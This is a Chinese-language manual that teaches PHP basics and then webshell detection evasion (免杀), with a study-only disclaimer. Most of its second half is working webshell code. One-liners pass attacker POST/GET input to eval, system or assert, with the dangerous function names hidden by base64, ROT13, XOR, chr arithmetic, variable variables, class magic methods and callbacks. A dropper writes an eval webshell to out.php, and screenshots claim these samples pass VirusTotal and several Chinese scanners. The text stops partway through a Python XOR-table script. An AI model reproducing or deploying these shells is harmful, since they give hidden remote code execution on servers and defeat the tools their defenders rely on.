# PHP从零学习到Webshell免杀手册
### 临渊羡鱼，不如退而结网；扬汤止沸，不如去火抽薪。

![WebShell-Bypass-Guide](https://socialify.git.ci/AabyssZG/WebShell-Bypass-Guide/image?description=1&font=Jost&forks=1&issues=1&language=1&logo=https%3A%2F%2Favatars.githubusercontent.com%2Fu%2F54609266%3Fv%3D4&name=1&owner=1&pattern=Floating%20Cogs&stargazers=1&theme=Dark)

**手册版本号：V1.4.1-2023/10/04**

这是一本能让你从零开始学习PHP的WebShell免杀的手册，同时我会在内部群迭代更新

### 如何在线阅读？

- 个人博客地址： [https://blog.zgsec.cn/archives/197.html](https://blog.zgsec.cn/archives/197.html)
- SeeBug Paper地址：[https://paper.seebug.org/3044/](https://paper.seebug.org/3044/)
- FreeBuf地址：[https://www.freebuf.com/articles/web/380751.html](https://www.freebuf.com/articles/web/380751.html)
- Gitee开源地址：[https://gitee.com/AabyssZG/WebShell-Bypass-Guide](https://gitee.com/AabyssZG/WebShell-Bypass-Guide)

**如果师傅们觉得不错，欢迎给我点个Star哈哈~**

有什么新的WebShell免杀姿势、手法，欢迎与我交流

## 渊龙Sec安全团队-AabyssZG整理

1. **本资料仅供学习参考，严禁使用者进行未授权渗透测试！**
2. **部分免杀思路来自互联网，欢迎各位师傅和我交流。**
3. **本文为内部参考资料，仅作学习交流，严禁任何形式的转载。**
4. **本文档内容为完整版，由渊龙Sec安全团队成员AabyssZG编写。**


# 一、PHP相关资料

- PHP官方手册： [https://www.php.net/manual/zh/](https://www.php.net/manual/zh/) 
- PHP函数参考： [https://www.php.net/manual/zh/funcref.php](https://www.php.net/manual/zh/funcref.php) 
- 菜鸟教程： [https://www.runoob.com/php/php-tutorial.html](https://www.runoob.com/php/php-tutorial.html) 
- w3school： [https://www.w3school.com.cn/php/index.asp](https://www.w3school.com.cn/php/index.asp) 
- 渊龙Sec安全团队导航： [https://dh.aabyss.cn](https://dh.aabyss.cn) 


# 二、PHP函数速查

## 0# PHP基础

### 0.0 PHP基础格式

```php
<?php
    //执行的相关PHP代码
?>
```

这是一个PHP文件的基本形式

### 0.1 .=和+=赋值

```php
$a = 'a'; //赋值
$b = 'b'; //赋值
$c = 'c'; //赋值
$c .= $a;
$c .= $b;

echo $c; //cab
```

- `.=` 通俗的说，就是累积
- `+=` 意思是：左边的变量的值加上右边的变量的值，再赋给左边的变量

### 0.2 数组

**`array()` 函数用于创建数组**

```php
$shuzu = array("AabyssZG","AabyssTeam");
echo "My Name is " . $shuzu[0] . ", My Team is " . $shuzu[1] . ".";
//My Name is AabyssZG, My Team is AabyssTeam.
```

**数组可嵌套：**

```php
$r = 'b[]=AabyssZG&b[]=system';
$rce = array();      //用array函数新建数组
parse_str($r, $rce); //这个函数下文有讲
print_r($rce);
```

`$rce` 数组输出为：

```php
Array (
    [b] => Array
        (
            [0] => AabyssZG
            [1] => system
        )
)
```

这时候可以这样利用

```php
$rce['b'][1](参数);    //提取rce数组中的b数组内容，相当于system(参数)
echo $rce['b'][0];    //AabyssZG
```

**使用 `[]` 定义数组**

```php
$z = ['A','a','b', 'y', 's', 's'];
$z[0] = 'A';
$z[1] = 'a';
$z[2] = 'b';
$z[3] = 'y';
$z[4] = 's';
$z[5] = 's';
```

这就是基本的一个数组，数组名为z，数组第一个成员为0，以此类推

**`compact()` 函数用于创建数组创建一个包含变量名和它们的值的数组**

```php
$firstname = "Aabyss";
$lastname = "ZG";
$age = "21";

$result = compact("firstname", "lastname", "age");
print_r($result);
```

数组输出为：

```php
Array ( [firstname] => Aabyss [lastname] => ZG [age] => 21 )
```

### 0.3 连接符

**`.` 最简单的连接符**

```php
$str1="hello";
$str2="world";
echo $str1.$str2;    //helloworld
```

### 0.4 运算符

**`&` 运算符**

加减乘除应该不用我说了吧

```php
($var & 1)  //如果$var是一个奇数，则返回true；如果是偶数，则返回false
```

**逻辑运算符**

特别是 `xor` 异或运算符，在一些场合需要用到

![xor.png](https://blog.zgsec.cn/usr/uploads/2023/03/2340198249.png)

### 0.5 常量

**自定义常量**

```php
define('-_-','smile');    //特殊符号开头，定义特殊常量
define('wo',3.14);
const wo = 3;
```

常量的命名规则

1. 常量不需要使用 `$` 符号，一旦使用系统就会认为是变量；
2. 常量的名字组成由字母、数字和下划线组成，不能以数字开头；
3. 常量的名字通常是以大写字母为主，以区别于变量；
4. 常量命名的规则比变量要松散，可以使用一些特殊字符，该方式只能使用 `define` 定义；

**`__FILE__` 常量（魔术常量）**

```php
__FILE__ //返回文件的完整路径和文件名

dirname(__FILE__) //返回文件所在当前目录到系统根目录的一个目录结构（即代码所在脚本的路径，不会返回当前的文件名称）
```

**其他魔术常量**

```php
__DIR__        //当前被执行的脚步所在电脑的绝对路径
__LINE__       //当前所示的行数
__NAMESPACE__  //当前所属的命名空间
__CLASS__      //当前所属的类
__METHOD__     //当前所属的方法
```

### 0.6 PHP特性

- PHP中函数名、方法名、类名不区分大小写，常量和变量区分大小写
- 在某些环境中，`<?php  ?>` 没有闭合会导致无法正常运作

### 0.7 PHP标记几种写法

其中第一和第二种为常用的写法
```php
第一种：<?php ?>
第二种：<?php
第三种：<? ?>
第四种：<% %>
第五种：<script language="php"></script>
```
第三种和第四种为短标识，当使用他们需要开启 `php.ini` 文件中的 `short_open_tag` ，不然会报错

### 0.8 $_POST变量

在 PHP 中，预定义的 `$_POST` 变量用于收集来自 `method="post"` 的表单中的值

```php
$num1=$_POST['num1'];
$num2=$_POST['num2'];
print_r($_POST);
```

当你在HTTP数据包Body传参时：
```php
num1=1&num2=2
```

得到回显：
```php
Array
(
    [num1] => 1
    [num2] => 2
)
```


## 1# 回调类型函数

### 1.0 Tips

在PHP的WebSehll免杀测试过程中，使用回调函数可以发现查杀引擎对函数和函数的参数是否有对应的敏感性

```php
array_map('system', array('whoami'));        //被查杀
array_map($_GET['a'], array('whoami'));      //被查杀
array_map('var_dump', array('whoami'));      //未被查杀
array_map('system', array($_GET['a']));      //被查杀
```

这里在列举一些回调函数，感兴趣可以自行查找：

```php
array_filter() 
array_walk()  
array_map()
array_reduce()
array_walk_recursive()
call_user_func_array()
call_user_func()
filter_var() 
filter_var_array() 
registregister_shutdown_function()
register_tick_function()
forward_static_call_array()
uasort() 
uksort() 
```

### 1.1 array_map()

**`array_map()` 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新的值的数组**

Demo：将函数作用到数组中的每个值上，每个值都乘以本身，并返回带有新的值的数组：

```php
function myfunction($v)
{
return($v*$v);
}
 
$a=array(1,2,3,4,5);    //array(1,4,9,16,25)
print_r(array_map("myfunction",$a));
```

### 1.2 register_shutdown_function()

**`register_shutdown_function()` 函数是来注册一个会在PHP中止时执行的函数**

PHP中止的情况有三种：

- 执行完成
- exit/die导致的中止
- 发生致命错误中止

Demo：后面的after并没有输出，即 `exit` 或者是 `die` 方法导致提前中止

```php
function test() 
{ 
 echo '这个是中止方法test的输出'; 
} 
  
register_shutdown_function('test'); 
  
echo 'before' . PHP_EOL; 
exit(); 
echo 'after' . PHP_EOL;
```

输出：

```php
before 
这个是中止方法test的输出
```

### 1.3 array_walk()

**`array_walk()` 函数对数组中的每个元素应用用户自定义函数**

Demo：这个很简单，直接看就明白了

```php
function myfunction($value,$key,$p)
{
echo "The key $key $p $value<br>";
}
$a=array("a"=>"red","b"=>"green","c"=>"blue");
array_walk($a,"myfunction","has the value");
```

输出：

```php
The key a has the value red
The key b has the value green
The key c has the value blue
```

### 1.4 array_filter()

**`array_filter()` 函数用回调函数过滤数组中的元素**

该函数把输入数组中的每个键值传给回调函数：如果回调函数返回 true，则把输入数组中的当前键值返回给结果数组（数组键名保持不变）

Demo：

```php
function test_odd($var)
{
    return($var & 1);
}
 
$a1=array("a","b",2,3,4);
print_r(array_filter($a1,"test_odd"));
```

输出：

```php
Array ( [3] => 3 )
```

### 1.5 foreach()

**`foreach()` 方法用于调用数组的每个元素，并将元素传递给回调函数**

foreach 语法结构提供了遍历数组的简单方式。foreach 仅能够应用于数组和对象，如果尝试应用于其他数据类型的变量，或者未初始化的变量将发出错误信息。

Demo：

```php
$arr = array(1,2,3,4);
//用foreach来处理$arr
foreach($arr as $k=>$v) {
    $arr[$k] = 2 * $v;
}
print_r($arr);
```

输出：

```php
Array
(
    [0] => 2
    [1] => 4
    [2] => 6
    [3] => 8
)
```

### 1.6 isset()

**`isset()` 函数用于检测变量是否已设置并且非 NULL**

isset 在php中用来判断变量是否声明，该函数返回布尔类型的值，即true/false
isset 只能用于变量，因为传递任何其它参数都将造成解析错误

Demo:

```php
$var = '';
 
// 结果为 TRUE，所以后边的文本将被打印出来。
if (isset($var)) {
    echo "变量已设置。" . PHP_EOL;
}
 
// 在后边的例子中，我们将使用 var_dump 输出 isset() 的返回值。
// the return value of isset().
 
$a = "test";
$b = "anothertest";
 
var_dump(isset($a));      // TRUE
var_dump(isset($a, $b)); // TRUE
 
unset ($a);
 
var_dump(isset($a));     // FALSE
var_dump(isset($a, $b)); // FALSE
 
$foo = NULL;
var_dump(isset($foo));   // FALSE
```

输出：

```php
bool(true)
bool(true)
bool(false)
bool(false)
bool(false)
```


## 2# 字符串处理类函数

### 2.0 Tips

可以自己定义函数，组成字符串的拼接方式，比如：

```php
function confusion($a){
    $s = ['A','a','b', 'y', 's', 's', 'T', 'e', 'a', 'm'];
    $tmp = "";
    while ($a>10) {
        $tmp .= $s[$a%10];
        $a = $a/10;
    }
    return $tmp.$s[$a];
}
echo confusion(976534);         //sysTem（高危函数）
```

这时候，给 `$a` 传参为 `976534` 即可拼接得 `system`

同样，还有很多字符串处理类的函数，可以参考如下：

```php
trim()           //从字符串的两端删除空白字符和其他预定义字符
ucfirst()        //把字符串中的首字符转换为大写
ucwords()        //把字符串中每个单词的首字符转换为大写
strtoupper()     //把字符串转换为大写
strtolower()     //把字符串转换为小写
strtr()          //转换字符串中特定的字符
substr_replace() //把字符串的一部分替换为另一个字符串
substr()         //返回字符串的一部分
strtok()         //把字符串分割为更小的字符串
str_rot13()      //对字符串执行 ROT13 编码
```

### 2.1 substr()

**`substr()` 函数返回字符串的一部分**

Demo：相当于截取字段固定长度和开头的内容

```php
echo substr("D://system//451232.php", -10, 6)."<br>";   //451232
echo substr("AabyssTeam", 0, 6)."<br>";                 //Aabyss
```

### 2.2 intval()

**`intval()` 获取变量的整数值**

```php
int intval(var,base)   //var指要转换成 integer 的数量值,base指转化所使用的进制 
```


如果 base 是 0，通过检测 var 的格式来决定使用的进制： 

- 如果字符串包括了 `0x` (或 `0X`) 的前缀，使用 16 进制 (hex)；  
- 否则，如果字符串以 `0` 开始，使用 8 进制(octal)；  
- 否则，将使用 10 进制 (decimal)

**成功时返回 var 的 integer 值，失败时返回 0。空的 array 返回 0，非空的 array  返回 1**

Demo：获取对应的整数值

```php
echo intval(042);      // 34
echo intval(0x1A);     // 26
echo intval(42);       // 42
echo intval(4.2);      // 4
```

### 2.3 parse_str()

**`parse_str()` 函数把查询字符串解析到变量中**

Demo：这个也很简单，看看例子就明白了

```php
parse_str("name=Peter&age=43");
echo $name."<br>";      //Peter
echo $age;              //43

parse_str("name=Peter&age=43",$myArray);
print_r($myArray);       //Array ( [name] => Peter [age] => 43 )
```

### 2.4 pack()

**`pack()` 函数函数把数据装入一个二进制字符串**

Demo：简单来说，就是将指定编码的数字转成字符串

```php
echo pack("C3",80,72,80);   //ASCII编码转换为PHP
echo pack("H*",4161627973735465616d);    //16进制编码转换为AabyssTeam
```

其他参数请参考菜鸟教程： [https://www.runoob.com/php/func-misc-pack.html](https://www.runoob.com/php/func-misc-pack.html)


## 3# 命令执行类函数

### 3.0 Tips

命令执行类函数在”某些情况“下是非常危险的，所以往往遭到杀毒软件和WAF的重点关注，所以在做免杀的时候，为了绕过污点检测往往都要将命令执行类函数进行拼接、重组、加密、混淆来规避查杀。

### 3.1 eval()

**`eval()` 函数把字符串按照 PHP 代码来计算，即执行PHP代码**

Demo：将其中的内容按照PHP代码执行

```php
echo 'echo "我想学php"';     //echo "我想学php"
eval('echo "我想学php";');   //"我想学php"
```

Demo：一句话木马将参数传到 `eval()`  函数内执行

```php
@eval($_POST['AabyssTeam']);
```

### 3.2 system()

**`system()` 函数的主要功能是在系统权限允许的情况下，执行系统命令（Windows系统和Linux系统均可执行）**

Demo：执行Whoami并回显

```php
system('whoami');
```

### 3.3 exec()

**`exec()` 函数可以执行系统命令，但它不会直接输出结果，而是将执行的结果保存到数组中**

Demo：将 `exec()` 函数执行的结果导入result数组

```php
exec( 'ls' , $result );
print_r($result);        //Array ( [0] => index.php )
```

### 3.4 shell_exec()

**`shell_exec()` 函数可以执行系统命令，但不会直接输出执行的结果，而是返回一个字符串类型的变量来存储系统命令的执行结果**

Demo：执行 `ls` 命令

```php
echo shell_exec('ls');    //index.php
```

### 3.5 passthru()

**`passthru()` 函数可以执行系统命令并将执行结果输出到页面中**

与 `system()` 函数不同的是，它支持二进制的数据，使用时直接在参数中传递字符串类型的系统命令即可 

Demo：执行 `ls` 命令

```php
passthru('ls');    //index.php
```

### 3.6 popen()

**`popen()` 函数可以执行系统命令,但不会输出执行的结果，而是返回一个资源类型的变量用来存储系统命令的执行结果**

故需要配合 `fread()` 函数来读取命令的执行结果

Demo：执行 `ls` 命令

```php
$result = popen('ls', 'r');    //参数1:执行ls命令 参数2:字符串类型
echo fread($result, 100);      //参数1:上面生成的资源 参数2:读取100个字节
```

### 3.7 反引号``

**反引号可以执行系统命令但不会输出结果，而是返回一个字符串类型的变量用来存储系统命令的执行结果**

可单独使用，也可配合其他命令执行函数使用来绕过参数中的过滤条件

Demo：执行 `ls` 命令

```php
echo `ls`;    //index.php
```

所以，就可以通过这个写出几乎最短的Webshell了

```php
<?=`$_GET[1]`;
```


## 4# 文件写入类函数

### 4.0 Tips

在Webshell的免杀过程中，一部分人另辟蹊径：通过执行一个执行内容为”写入恶意PHP“的样本来绕过查杀，执行成功后会在指定目录写入一个恶意PHP文件，最后通过连接那个恶意PHP文件获得WebShell

### 4.1 fwrite()

**`fwrite()` 函数是用于写入文件，如果成功执行，则返回写入的字节数；失败，则返回 FALSE**

Demo：将 `Hello World. Testing!` 写入 `test.txt`

```php
$file = fopen("test.txt","w");
echo fwrite($file,"Hello World. Testing!");    //21
fclose($file);
```

### 4.2 file_put_contents()

**`file_put_contents()` 函数把一个字符串写入文件中**

如果文件不存在，将创建一个文件

Demo：使用 `FILE_APPEND` 标记，可以在文件末尾追加内容

```php
$file = 'sites.txt';
$site = "\nGoogle";
file_put_contents($file, $site, FILE_APPEND);
```

同时该函数可以配合解密函数写入文件，比如：

```php
$datatest = "[文件的base64编码]";
file_put_contents('./要写入的文件名', base64_decode($datatest));
```


## 5# 异常处理类函数

### 5.0 Tips

在PHP的异常处理中，异常处理的相关函数引起了安全行业人员的注意，可以构造相关的异常处理，来绕过WAF的识别和检测。

### 5.1 Exception 类

`Exception` 类是php所有异常的基类，这个类包含如下方法：

```php
__construct  //异常构造函数
getMessage   //获取异常消息内容
getPrevious  //返回异常链中的前一个异常，如果不存在则返回null值
getCode      //获取异常代码
getFile      //获取发生异常的程序文件名称
getLine      //获取发生异常的代码在文件中的行号
getTrace     //获取异常追踪信息，其返回值是一个数组
getTraceAsString //获取字符串类型的异常追踪信息
```

写个简单的例子方便理解：

```php
// 创建一个有异常处理的函数
function checkNum($number)
{
    if($number>1)
    {
        throw new Exception("变量值必须小于等于 1");
    }
        return true;
}
// 在 try 块 触发异常
try
{
    checkNum(2);
    // 如果抛出异常，以下文本不会输出
    echo '如果输出该内容，说明 $number 变量';
}
// 捕获异常
catch(Exception $e)
{
    echo 'Message: ' .$e->getMessage() . "<br>" ; 
    echo "错误信息：" . $e->getMessage() . "<br>";
		echo "错误码：" . $e->getCode() . "<br>";
		echo "错误文件：" . $e->getFile() . "<br>";
		echo "错误行数：" . $e->getLine() . "<br>";
		echo "前一个异常：" . $e->getPrevious() . "<br>";
		echo "异常追踪信息：";
		echo "" . print_r($e->getTrace(), true) . "<br>";
		echo "报错内容输出完毕";
}
```

运行后输出结果：

```php
Message: 变量值必须小于等于 1
错误信息：变量值必须小于等于 1
错误码：0
错误文件：D:\phpstudy_pro\WWW\AabyssZG\error.php
错误行数：7
前一个异常：
异常追踪信息：Array ( [0] => Array ( [file] => D:\phpstudy_pro\WWW\AabyssZG\error.php [line] => 14 [function] => checkNum [args] => Array ( [0] => 2 ) ) )
报错内容输出完毕
...
```


## 6# 数据库连接函数

### 6.0 Tips

可以尝试通过读取数据库内的内容，来获取敏感关键词或者拿到执行命令的关键语句，就可以拼接到php中执行恶意的代码了。

### 6.1 Sqlite数据库

配合我上面写的 `file_put_contents()` 文件写入函数，先写入本地Sqlite文件然后读取敏感内容

```php
$path = "AabyssZG.db";
$db = new PDO("sqlite:" . $path);
//连接数据库后查询敏感关键词
$sql_stmt = $db->prepare('select * from test where name="system"');
$sql_stmt->execute();
//提权敏感关键词并进行拼接
$f = substr($sql_stmt->queryString, -7, 6);
$f($_GET['aabyss']);       //system($_GET['aabyss']);
```

### 6.2 MySQL数据库

这里使用 `MySQLi()` 这个函数，其实PHP有很多MySQL连接函数，可自行尝试

然后通过这个函数，连接公网数据库（只要目标能出网），即可连接并获得敏感字符拼接到php中

```php
function coon($sql) {
    $mysqli = new MySQLi("localhost", "test", "test123", "test");
    //默认的 MySQL的类，其属性与方法见手册
    if ($mysqli - > connect_error) {
        //connect_error为属性，报错
        die("数据库连接失败：".$mysqli - > connect_errno. "--".$mysqli - > connect_error);
        // connect_errno:错误编号
    }
    $mysqli - > select_db("test"); //选择数据库
    // 返回值 $res 为资源类型（获取到结果的资源类型）
    $res = $mysqli - > query($sql) or die($mysqli - > error);
    //释放结果集，关闭连接
    $mysqli - > close();
}
$sql = "select * from test where name LIKE 'system'";
$arr = coon($sql);
$res = array("data" => $arr);
echo json_encode($res);
```


## 7# PHP过滤器

![PHP过滤器.png](https://blog.zgsec.cn/usr/uploads/2023/03/2236941522.png)


# 三、Webshell免杀

## 学习后的免杀效果

学习本手册后，可以达到如下效果，当然这只是拿其中的一个简单的例子进行测试的，感兴趣的可以深入学习并自由组合

#### 牧云Webshell检测引擎：

![CT绕过截图.png](https://blog.zgsec.cn/usr/uploads/2023/03/1771975426.png)

#### 微步在线云沙箱：

![微步绕过.png](https://blog.zgsec.cn/usr/uploads/2023/03/3763177419.png)

![微步绕过检测.png](https://blog.zgsec.cn/usr/uploads/2023/03/3675903.png)

#### 河马WebShell在线查杀：

![河马绕过.png](https://blog.zgsec.cn/usr/uploads/2023/03/3656310788.png)

#### 百度WEBDIR+在线查杀：

![百度绕过.png](https://blog.zgsec.cn/usr/uploads/2023/03/725947212.png)

#### 大名鼎鼎的VirusTotal：

![VT绕过.png](https://blog.zgsec.cn/usr/uploads/2023/03/2093982005.png)

## 0# 免杀思路概述

首先，要知己知彼，才能针对性做出策略来使得WebShell成功免杀

### 0.1 WebShell查杀思路

对于WebShell的查杀思路，大致有以下几种：

- 分析统计内容（传统）：可以结合字符黑名单和函数黑名单或者其他特征列表（例如代码片段的Hash特征表），之后通过对文件信息熵、元字符、特殊字符串频率等统计方式发现WebShell。
- 语义分析（AST）：把代码转换成AST语法树，之后可以对一些函数进行调试追踪，那些混淆或者变形过的webshell基本都能被检测到。但是对于PHP这种动态特性很多的语言，检测就比较吃力，AST是无法了解语义的。
- 机器学习（AI）：这种方法需要大量的样本数据，通过一些AI自动学习模型，总结归类Webshell的特征库，最终去检测Webshell。
- 动态监控（沙箱）：采用RASP方式，一旦检测到有对应脚本运行，就去监控（Hook）里边一些危险函数，一但存在调用过程将会立刻阻止。这种阻止效果是实时的，这种方法应该是效果最好的，但是成本十分高昂。

### 0.2 WebShell整体免杀思路

而对于最常见也是最简单的WebShell，即一句话木马，都是以下形式存在的：

![WebShell基本构造.png](https://blog.zgsec.cn/usr/uploads/2023/03/1615821851.png)

**而我们要做的是：通过PHP语言的动态特性，灵活利用各种PHP函数和特性，混淆和变形中间两部分内容，从而达到免杀**

### 0.3 WebShell免杀注意点

#### 0.3.1 `eval()` 高危函数

`eval()` 不能作为函数名动态执行代码，官方说明如下：eval 是一个语言构造器而不是一个函数，不能被可变函数调用

> 可变函数：通过一个变量获取其对应的变量值，然后通过给该值增加一个括号 ()，让系统认为该值是一个函数，从而当做函数来执行

人话：`eval()` 函数不能通过拼接、混淆来进行执行，只能通过明文直接写入

#### 0.3.2  ` assert()` 高危函数

在PHP7 中，` assert ()` 也不再是函数了，变成了一个语言结构（类似于 eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点，这个感兴趣可以自行了解即可

所以在WebShell免杀这块，我还是更喜欢用 ` system()` 高危函数，以下很多案例都是使用 ` system()` 来最终执行的

### 0.4 WebShell免杀测试

- 渊龙Sec团队导航（上面啥都有）： [https://dh.aabyss.cn/](https://dh.aabyss.cn/)
- 长亭牧云查杀： [https://stack.chaitin.com/security-challenge/webshell/index](https://stack.chaitin.com/security-challenge/webshell/index)
- 阿里云恶意文件检测平台：[https://ti.aliyun.com/#/webshell](https://ti.aliyun.com/#/webshell)
- 阿里伏魔引擎： [https://xz.aliyun.com/zues](https://xz.aliyun.com/zues) 
- VirusTotal： [https://www.virustotal.com/gui/home/upload](https://www.virustotal.com/gui/home/upload) 
- 微步在线云沙箱： [https://s.threatbook.com/](https://s.threatbook.com/)
- 河马WebShell查杀： [https://n.shellpub.com/](https://n.shellpub.com/) 
- 百度WEBDIR+： [https://scanner.baidu.com/](https://scanner.baidu.com/) 
- D盾： [http://www.d99net.net/](http://www.d99net.net/) 
- 网站安全狗： [http://free.safedog.cn/website_safedog.html](http://free.safedog.cn/website_safedog.html) 

## 1# 编码绕过

这算是早期的免杀手法，可以通过编码来绕过WAF的检测，如下：

### 1.1 Base64编码

```php
<?php
$f = base64_decode("YX____Nz__ZX__J0");  //解密后为assert高危函数
$f($_POST[aabyss]);                      //assert($_POST[aabyss]);
?>
```

### 1.2 ASCII编码

```php
<?php
//ASCII编码解密后为assert高危函数
$f =  chr(98-1).chr(116-1).chr(116-1).chr(103-2).chr(112+2).chr(110+6);
$f($_POST['aabyss']);                //assert($_POST['aabyss']);
?>
```

### 1.3 ROT13编码

```php
$f = str_rot13('flfgrz');  //解密后为system高危函数
$f($_POST['aabyss']);      //system($_POST['aabyss']);
```

当然还有很多其他的编码和加密方式，但常见的编码方式都被放入敏感名单了，会根据加密的形式自动进行解密

可以考虑一些比较冷门的编码方式，或者写一个类似于凯撒密码的加密函数，来对WAF进行ByPass

### 1.4 Gzip压缩加密

我先举一个 `phpinfo()` 加密后的示例：

```php
/*Protected by AabyssZG*/
eval(gzinflate(base64_decode('40pNzshXKMgoyMxLy9fQtFawtwMA'))); 
```

加密手法可以看我写的博客： [https://blog.zgsec.cn/archives/147.html](https://blog.zgsec.cn/archives/147.html) 

## 2# 字符串混淆处理绕过

### 2.1 自定义函数混淆字符串

通过对上面所说两部分敏感内容的拼接、混淆以及变换，来绕过WAF的检测逻辑，如下：

```php
function confusion($a){
    $s = ['A','a','b', 'y', 's', 's', 'T', 'e', 'a', 'm'];
    $tmp = "";
    while ($a>10) {
        $tmp .= $s[$a%10];
        $a = $a/10;
    }
    return $tmp.$s[$a];
}
$f = confusion(976534);         //sysTem（高危函数）
$f($_POST['aabyss']);           //sysTem($_POST['aabyss']);
```

### 2.2 自定义函数+文件名混淆

同样，可以配合文件名玩出一些花活，我们建一个PHP名字为 `976534.php`：

```php
function confusion($a){
    $s = ['A','a','b', 'y', 's', 's', 'T', 'e', 'a', 'm'];
    $tmp = "";
    while ($a>10) {
        $tmp .= $s[$a%10];
        $a = $a/10;
    }
    return $tmp.$s[$a];
}

$f = confusion(intval(substr(__FILE__, -10, 6)));   //sysTem（高危函数）
//__FILE__为976534.php
//substr(__FILE__, -10, 6)即从文件名中提取出976534
//confusion(intval(976534))即输出了sysTem（高危函数），拼接即可
$f($_POST['aabyss']);        //sysTem($_POST['aabyss']);
```

首先先读取文件名，从 `976534.php` 文件名中提取出 `976534` ，然后带入函数中就成功返还 `sysTem` 高危函数了，可以配合其他姿势一起使用，达成免杀效果

### 2.3 特殊字符串

主要是通过一些特殊的字符串，来干扰到杀软的正则判断并执行恶意代码（各种回车、换行、null和空白字符等）

```php
$f = 'hello';
$$z = $_POST['aabyss'];
eval(``.$hello);
```

## 3# 生成新文件绕过

这是我之前写的一个免杀，其实原理也很简单，该PHP本身没法执行命令，但是运行后可以在同目录混淆写入一个WebShell，也是可以进行免杀的：

```php
$hahaha = strtr("abatme","me","em");      //$hahaha = abatem
$wahaha = strtr($hahaha,"ab","sy");       //$wahaha = system（高危函数）
$gogogo = strtr('echo "<?php evqrw$_yKST[AABYSS])?>" > ./out.php',"qrwxyK","al(_PO");
//$gogogo = 'echo "<?php eval(_POST[AABYSS])?>" > ./out.php'
$wahaha($gogogo);  //将一句话木马内容写入同目录下的out.php中
```

现在看这个是不是很简单，但是这个可是VirusTotal全绿、微步沙箱和百度沙箱都过的哦~

没想到吧~ 其实在这个简单的基础上还可以拓展出来进行高阶免杀操作

## 4# 回调函数绕过

通过回调函数，来执行对应的命令，这里举两个例子：

### 4.1 call_user_func_array()

```php
//ASCII编码解密后为assert高危函数
$f =  chr(98-1).chr(116-1).chr(116-1).chr(103-2).chr(112+2).chr(110+6);
call_user_func_array($f, array($_POST['aabyss']));
```

### 4.2 array_map()

```php
function fun() {
    //ASCII编码解密后为assert高危函数
	$f =  chr(98-1).chr(116-1).chr(116-1).chr(103-2).chr(112+2).chr(110+6);
	return ''.$f;
}
$user = fun();    //拿到assert高危函数
$pass =array($_POST['aabyss']);
array_map($user,$user = $pass );
```

回调函数的免杀早早就被WAF盯上了，像这样单独使用一般都没办法免杀，所以一般都是配合其他手法使用

## 5# 可变变量绕过

### 5.1 简单可变变量

什么叫可变变量呢？看一下具体例子就明白了：

```php
$f = 'hello';    //变量名为f，变量值为Hello
$$f = 'AabyssZG';  //变量名为Hello（也就是$f的值），值为AabyssZG
echo $hello;     //输出AabyssZG
```

那要怎么利用这个特性呢？如下：

```php
$f ='hello';
$$f = $_POST['aabyss'];
eval($hello);   //eval($_POST['aabyss']); 
```

### 5.2 数组+变量引用混淆

上文提到，可以通过 `compact` 创建一个包含变量名和它们的值的数组

那就可以用 `compact` 创建一个包含恶意函数和内容的数组，再引用出来拼接成语句即可

```php
$z = "system";                        //配合其他姿势，将system高危函数传给z
$zhixin  = &$z;
$event = 'hahaha';

$result = compact("event", "zhixin"); //通过compact创建数组
$z = 'wahaha';                        //我将变量z进行修改为'wahaha'

$f = $result['zhixin'];
$f($_POST['aabyss']);                  //system($_POST['aabyss']); 
```

根据5.1学到的内容，可以发现传入数组后，函数内容被替换是不会影响数组中的内容的

于是先用变量 `zhixin` 来引用变量 `z` 然后通过 `compact` 创建为数组，接下来再将变量 `z` 附上新的内容 `wahaha` ，传统的WAF追踪变量的内容时候，就会让查杀引擎误以为数组中的值不是 `system` 而是  `wahaha` ，从而达到WebShell免杀

## 6# 数组绕过

先将高危函数部分存储在数组中，等到时机成熟后提取出来进行拼接

### 6.1 一维数组

```php
$f = substr_replace("systxx","em",4);         //system（高危函数）
$z = array($array = array('a'=>$f($_GET['aabyss'])));
var_dump($z);
```

数组内容如下：

```php
Array ( [0] => Array ( [a] => assert($_GET['aabyss']) ) )
```

### 6.2 二维数组

```php
$f = substr_replace("systxx","em",4);          //system（高危函数）
$z = array($arrayName = ($arrayName = ($arrayName = array('a' => $f($_POST['aabyss'])))));
var_dump($z);
```

## 7# 类绕过

通过自定义类或者使用已知的类，将恶意代码放入对应的类中进行执行

### 7.1 单类

```php
class Test
{
    public $_1='';
    function __destruct(){
        system("$this->a");
    }
}
$_2 = new Test;
$_2->$_1 = $_POST['aabyss'];
```

### 7.2 多类

```php
class Test1
{
    public $b ='';
    function post(){
        return $_POST['aabyss'];
    }
}
class Test2 extends Test1
{
    public $code = null;
    function __construct(){
        $code = parent::post();
        system($code);
    }
}
$fff = new Test2;
$zzz = new Test1;
```

主要还是要用一些魔术方法来进行ByPass

## 8# 嵌套运算绕过

主要通过各种嵌套、异或以及运算来拼装出来想要的函数，再利用PHP允许动态函数执行的特点，拼接处高危函数名，如 `system` ，然后动态执行恶意代码之即可

### 8.1 异或

`^` 为异或运算符，在PHP中两个变量进行异或时，会将字符串转换成二进制再进行异或运算，运算完再将结果从二进制转换成了字符串

```php
$f = ('.'^']').('$'^']').('.'^']').('4'^'@').('8'^']').(']'^'0');   //system高危函数
$f = ('.$.48]' ^ ']]]@]0');   //等同于这样
$f($_POST['aabyss']);
```

这里的话，可以参考国光大佬的Python脚本生成异或结果，然后来替换即可：`python3 xxx.py > results.txt`

```python
import string
from urllib.parse import quote

keys = list(range(65)) + list(range(91,97)) + list(range(123,127))
results = []


for i in keys:
    for j in keys:
        asscii_number = i^j
        if (asscii_number >= 65 and asscii_number <= 90) or (asscii_number >= 97 and asscii_number <= 122):
            if i < 32 and j < 32:
                temp = (f'{chr(asscii_number)} = ascii:{i} ^ ascii{j} =  {quote(chr(i))} ^ {quote(chr(j))}', chr(asscii_number))
                results.append(temp)
            elif i < 32 and j >=32:
                temp = (f'{chr(asscii_number)} = ascii:{i} ^ {chr(j)} = {quote(chr(i))} ^ {quote(chr(j))}', chr(asscii_number))
                results.append(temp)
            elif i >= 32 and j < 32:
                temp = (f'{chr(asscii_number)} = {chr(i)} ^ ascii{j} = {quote(chr(i))} ^ {quote(chr(j))}', chr(asscii_number))
                results.append(temp)
            else:
                temp = (f'{chr(asscii_number)} = {chr(i)} ^ {chr(j)} = {quote(chr(i))} ^ {quote(chr(j))}', chr(asscii_number))
                results.append(temp)

results.sort(key=lambda x:x[1], reverse=False)

for low_case in string.ascii_lowercase:
    for result in results:
        if low_case in result:
